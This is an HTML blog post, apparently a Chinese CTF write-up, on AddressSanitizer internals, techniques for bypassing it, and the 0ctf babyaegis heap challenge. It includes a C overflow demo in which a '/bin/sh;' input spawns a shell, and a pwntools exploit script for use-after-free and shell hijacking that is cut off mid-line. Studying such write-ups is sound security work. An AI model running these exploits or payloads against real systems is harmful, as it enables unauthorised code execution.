@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="EN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>ASan and ASan in CTF(0ctf babyaegis) | Swing&#39;Blog 浮生若梦</title>
+
+
+<meta name="description" content="Know it then hack it!">
+
+
+<meta name="author" content="Swing">
+
+
+
+<!-- Canonical -->
+<link rel="canonical" href="/asan-and-asan-in-ctf-0ctf-babyaegis.html">
+
+<!-- Favicon -->
+<link rel="icon" href="/images/favicon.ico">
+
+<!-- RSS -->
+
+<link rel="alternate" type="application/rss+xml" title="Swing&#39;Blog 浮生若梦" href="/atom.xml">
+
+
+<!-- Open Graph -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="ASan and ASan in CTF(0ctf babyaegis)">
+<meta property="og:url" content="/asan-and-asan-in-ctf-0ctf-babyaegis.html">
+<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
+
+<meta property="og:description" content="Know it then hack it!">
+
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ASan and ASan in CTF(0ctf babyaegis)">
+
+<meta name="twitter:description" content="Know it then hack it!">
+
+
+<!-- Theme Color -->
+<meta name="theme-color" content="#1d1f21">
+<meta name="msapplication-TileColor" content="#1d1f21">
+
+<!-- Stylesheets -->
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<!-- Custom Layout Variables -->
+
+<style>
+:root {
+  --page-width: 60rem;
+  --content-width: 1200px;
+  --mobile-padding: 12px;
+}
+</style>
+
+<!-- Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-133464311-1');
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body class="theme-dark">
+  <div class="container">
+    <header class="header">
+  <div class="header-inner">
+    <div class="header-brand">
+      
+        <a href="/" class="logo">
+          <img src="/images/logo.png"
+               width="50"
+               height="50"
+               alt="Swing&#39;Blog 浮生若梦">
+        </a>
+      
+      <a href="/" class="site-title">
+        Swing&#39;Blog 浮生若梦
+      </a>
+    </div>
+
+    <nav class="nav">
+      <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation">
+        <span class="nav-toggle-bar"></span>
+        <span class="nav-toggle-bar"></span>
+        <span class="nav-toggle-bar"></span>
+      </button>
+
+      <ul class="nav-menu" id="nav-menu">
+        
+          
+          
+            
+            <li class="nav-item">
+              <a href="/"
+                 class="nav-link"
+                 >
+                Home
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/about/"
+                 class="nav-link"
+                 >
+                About
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/archives/"
+                 class="nav-link"
+                 >
+                Articles
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/atom.xml"
+                 class="nav-link"
+                 >
+                RSS
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/categories/"
+                 class="nav-link"
+                 >
+                Categories
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/link"
+                 class="nav-link"
+                 >
+                Links
+              </a>
+            </li>
+            
+          
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main class="main">
+      
+        <div class="page-layout">
+          <article class="post">
+  <header class="post-header">
+  <h1 class="post-title">ASan and ASan in CTF(0ctf babyaegis)</h1>
+
+  <div class="post-meta">
+    <span class="meta-item">
+      <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zM9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
+      <time datetime="2019-03-23">
+        2019-03-23
+      </time>
+    </span>
+
+    
+      <span class="meta-item">
+        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79s7.15 2.71 9.88 0C18.32 15.65 19 14.08 19 12.1h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58s9.14-3.47 12.65 0L21 3v7.12z"/></svg>
+        <time datetime="2026-02-07">
+          Updated on 2026-02-07
+        </time>
+      </span>
+    
+
+    
+      <span class="meta-item">
+        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
+        
+          <a href="/categories/Other/">Other</a>
+        
+      </span>
+    
+  </div>
+</header>
+
+
+  
+    <nav class="toc">
+  <h3 class="toc-title">Table of Contents</h3>
+  <div class="toc-list">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ASan-%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0"><span class="toc-text">ASan 算法实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="toc-text">内存映射</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-text">64位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-text">32位</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypassing-AddressSanitizer"><span class="toc-text">Bypassing AddressSanitizer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Adjacent-Buffers-in-the-Same-Struct-Class"><span class="toc-text">Adjacent Buffers in the Same Struct&#x2F;Class</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0ctf-babyaegis"><span class="toc-text">0ctf babyaegis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text">漏洞点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a>
+  </div>
+</nav>
+
+  
+
+  <div class="post-content">
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="About-AddressSanitizer-ASan"><a href="#About-AddressSanitizer-ASan" class="headerlink" title="About AddressSanitizer(ASan)"></a>About AddressSanitizer(ASan)</h1><p>AddressSanitizer 后文均简称为ASan 是 Google 开源的一个用于进行内存检测的工具，包括但可能不限于 Heap buffer overflow, Stack buffer overflow, Global buffer overflow 等等。</p>
+<p>在 wiki 中就举了了四个例子，分别是</p>
+<ol>
+<li> Heap-use-after-free</li>
+<li> Heap-buffer-overflow</li>
+<li> Stack-buffer-overflow</li>
+<li> Global-buffer-overflow</li>
+</ol>
+<p>除了学术上的建树，这个工具也曾发现了不少漏洞，如在知名的 j00r 的<a href="https://j00ru.vexillium.org/2014/01/ffmpeg-and-the-tale-of-a-thousand-fixes/">blog</a> 中提到的</p>
+<p>关于 ASan 的核心实现在 wiki 也提到了，在我读了一些 paper 以及在 0ctf babyaegis 这个题目的调试也大概总结了一下：</p>
+<h2 id="ASan-算法实现"><a href="#ASan-算法实现" class="headerlink" title="ASan 算法实现"></a>ASan 算法实现</h2><p>ASan 由两个主要部分构成，插桩和动态运行库( Run-time library )，插桩主要是针对在llvm编译器级别对访问内存的操作(store，load，alloca等)，将它们进行处理。动态运行库主要提供一些运行时的复杂的功能(比如poison/unpoison shadow memory)以及将malloc,free等系统调用函数hook住。其实该算法的思路很简单，如果想防住Buffer Overflow漏洞，只需要在每块内存区域右端（或两端，能防overflow和underflow）加一块区域（RedZone），使RedZone的区域的影子内存（Shadow Memory)设置为不可写即可。</p>
+<p>+——————-+<br>|     redzone          |<br>+——————-+<br>|       mem              |<br>+——————-+<br>|     redzone          |<br>+——————-+<br>|       mem              |<br>+——————-+<br>|     redzone          |<br>+——————-+</p>
+<h3 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h3><p>AddressSanitizer保护的主要原理是对程序中的虚拟内存提供粗粒度的影子内存(没8个字节的内存对应一个字节的影子内存)，为了减少overhead，就采用了直接内存映射策略，所采用的具体策略如下：Shadow=(Mem &gt;&gt; 3) + offset。每8个字节的内存对应一个字节的影子内存，影子内存中每个字节存取一个数字k,如果k=0，则表示该影子内存对应的8个字节的内存都能访问。<br>如果k在0到7之间,表示前k个字节可以访问，如果k为负数，不同的数字表示不同的错误（e.g. Stack buffer overflow, Heap buffer overflow)。具体的映射策略如下图所示。</p>
+<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shadow &#x3D; (Mem &gt;&gt; 3) + 0x7fff8000;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>[0x10007fff8000, 0x7fffffffffff]</th>
+<th>HighMem</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[0x02008fff7000, 0x10007fff7fff]</td>
+<td>HighShadow</td>
+</tr>
+<tr>
+<td>[0x00008fff7000, 0x02008fff6fff]</td>
+<td>ShadowGap</td>
+</tr>
+<tr>
+<td>[0x00007fff8000, 0x00008fff6fff]</td>
+<td>LowShadow</td>
+</tr>
+<tr>
+<td>[0x000000000000, 0x00007fff7fff]</td>
+<td>LowMem</td>
+</tr>
+</tbody></table>
+<h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shadow &#x3D; (Mem &gt;&gt; 3) + 0x20000000;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>[0x40000000, 0xffffffff]</th>
+<th>HighMem</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[0x28000000, 0x3fffffff]</td>
+<td>HighShadow</td>
+</tr>
+<tr>
+<td>[0x24000000, 0x27ffffff]</td>
+<td>ShadowGap</td>
+</tr>
+<tr>
+<td>[0x20000000, 0x23ffffff]</td>
+<td>LowShadow</td>
+</tr>
+<tr>
+<td>[0x00000000, 0x1fffffff]</td>
+<td>LowMem</td>
+</tr>
+</tbody></table>
+<h1 id="Bypassing-AddressSanitizer"><a href="#Bypassing-AddressSanitizer" class="headerlink" title="Bypassing AddressSanitizer"></a>Bypassing AddressSanitizer</h1><p>显而易见的是，ASan 的检查很大一部分是基于影子内存中，此时影子内存的flag值。假设如果全段影子内存的 flag 全为0，我们就可以完全无视掉ASan，而0ctf 的 babyaegis，正是给了一个写0的机会，给了我们一次对一个指针再次读写的机会。</p>
+<p>此外还有几种方法，比如</p>
+<h3 id="Adjacent-Buffers-in-the-Same-Struct-Class"><a href="#Adjacent-Buffers-in-the-Same-Struct-Class" class="headerlink" title="Adjacent Buffers in the Same Struct/Class"></a>Adjacent Buffers in the Same Struct/Class</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ cat test1.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Test()&#123;</span><br><span class="line"> command[<span class="number">0</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line"> command[<span class="number">1</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"> command[<span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line"> system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> command[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> Test aTest = Test();</span><br><span class="line"> aTest.a();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ localhost in /tmp [1:42:48]</span></span><br><span class="line">$ g++ -O -g -fsanitize=address test1.c</span><br><span class="line">clang: warning: treating <span class="string">&#x27;c&#x27;</span> input as <span class="string">&#x27;c++&#x27;</span> when <span class="keyword">in</span> C++ mode, this behavior is deprecated [-Wdeprecated]</span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ localhost in /tmp [1:43:10]</span></span><br><span class="line">$ ./a.out</span><br><span class="line">aaaaaaaaaa/bin/sh;</span><br><span class="line">sh-3.2$ id</span><br><span class="line">uid=501(swing) gid=20(staff) groups=20(staff),701(com.apple.sharepoint.group.1),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh-disabled)</span><br><span class="line">sh-3.2$</span><br></pre></td></tr></table></figure>
+
+<p>剩下见 PDF： <a href="https://dl.packetstormsecurity.net/papers/general/BreakingAddressSanitizer.pdf">https://dl.packetstormsecurity.net/papers/general/BreakingAddressSanitizer.pdf</a></p>
+
+
+	<div class="row">
+    <embed src="https://dl.packetstormsecurity.net/papers/general/BreakingAddressSanitizer.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+
+<h1 id="0ctf-babyaegis"><a href="#0ctf-babyaegis" class="headerlink" title="0ctf babyaegis"></a>0ctf babyaegis</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@linuxkit-025000000001 /pwn<span class="comment"># checksec aegis</span></span><br><span class="line">[*] <span class="string">&#x27;/pwn/aegis&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line">    ASAN:     Enabled</span><br><span class="line">    UBSAN:    Enabled   </span><br></pre></td></tr></table></figure>
+<p>   开了 ASan </p>
+<p>  影子内存位置： mem &gt;&gt; 3) + 0x7FFF8000LL</p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在update中：</p>
+<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-657eaed4aa9ce0cd1023d12f35aa24ce-14e9ce.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-657eaed4aa9ce0cd1023d12f35aa24ce-14e9ce.png"></a></p>
+<p>在delete中</p>
+<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-b847e1c6e31286912ed11a4b637c21bf-ed3fe6.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-b847e1c6e31286912ed11a4b637c21bf-ed3fe6.png"></a></p>
+<p>存在uaf</p>
+<p>此外，存在一个后门函数为：secret函数</p>
+<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-b8bdbcb75976ba5e986c873738b299dc-0b7570.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-b8bdbcb75976ba5e986c873738b299dc-0b7570.png"></a></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>可以先置checker为0使得我们可以进行一个堆溢出改size值为0，接下来在做一次更改，这次可以溢出更多，改size为更大的值。然后rm了这个堆块再malloc出来就可以造成一个uaf的效果。接着利用uaf的指针泄漏各种program base 和libc base什么的东西。然后利用指针去改写bss段上的值导致__sanitizer::Die()函数内部call rax 调用我们想调用的函数。这里本来是想调用onegadget，但是不明确也没深究为什么onegadget没起作用。之后此处改写为gets控制程序流然后构成栈溢出覆盖ret为onegadget接着就getshell了</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;notiterm&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;iterm&#x27;</span>,<span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;notiterm&#x27;, &#x27;-t&#x27;, &#x27;iterm&#x27;, &#x27;-p&#x27;, &#x27;15112&#x27;, &#x27;-e&#x27;] # use 50806 port as an example</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;./aegis&#x27;</span>)</span><br><span class="line">    <span class="comment"># p=process(&#x27;./aegis&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;111.186.63.209&#x27;</span>,<span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pu</span>(<span class="params">x</span>):</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pu_enter</span>(<span class="params">x</span>):</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">sz,content,<span class="built_in">id</span></span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    pu_enter(<span class="built_in">str</span>(sz))</span><br><span class="line">    get(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(<span class="string">&#x27;ID&#x27;</span>)</span><br><span class="line">    pu_enter(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx,content,<span class="built_in">id</span></span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(<span class="built_in">str</span>(idx))</span><br><span class="line">    get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    pu(content)</span><br><span class="line">    get(<span class="string">&#x27;New ID:&#x27;</span>)</span><br><span class="line">    pu_enter(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    pu_enter(<span class="built_in">str</span>(idx))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>(<span class="params">addr</span>):</span></span><br><span class="line">    pu_enter(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    get(<span class="string">&#x27;Lucky Number: &#x27;</span>)</span><br><span class="line">    pu_enter(<span class="built_in">str</span>(addr))</span><br><span class="line">    get(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x123456789abcdef</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>,<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x602000000000</span></span><br><span class="line"><span class="comment">#0x7fff8000</span></span><br><span class="line">secret(<span class="number">0xc047fff8008</span>-<span class="number">4</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x12</span>,<span class="number">0x123456789</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x02ffffff00000002</span>)[:<span class="number">7</span>],<span class="number">0x01f000ff1002ff</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;#&quot;)</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x602000000018</span>),<span class="number">0</span>)</span><br><span class="line"><span class="comment">#raw_input(&quot;#&quot;)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">addr = u64(get(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> addr</span><br><span class="line">pbase = addr -<span class="number">0x114AB0</span></span><br><span class="line">get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">5</span>,p64(pbase+<span class="number">0x347DF0</span>)[:<span class="number">2</span>],(pbase+<span class="number">0x347DF0</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">addr = u64(get(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = addr -<span class="number">0xE4FA0</span></span><br><span class="line">get(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">5</span>,p64(pbase+<span class="number">0x0FB08A0</span>),p64(pbase+<span class="number">0x7AE140</span>))</span><br><span class="line"><span class="comment">#update(5,p64(pbase+0xfb08a0+0x28),(pbase+0xfb08a0+0x28)&gt;&gt;8)</span></span><br><span class="line">raw_input(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">pu_enter(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">pu_enter(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line"><span class="comment">#raw_input(hex(pbase+0x7AE140))</span></span><br><span class="line">pu(p64(base+<span class="number">524464</span>)[:<span class="number">7</span>])</span><br><span class="line"><span class="comment">#get(&#x27;ID&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&quot;#get&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(pbase+<span class="number">0x7AE140</span>)))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">471</span>+p64(base+<span class="number">0x4f322</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x100</span></span><br><span class="line"><span class="comment">#raw_input(hex(base + 0x4f322))</span></span><br><span class="line">pu_enter(payload)</span><br><span 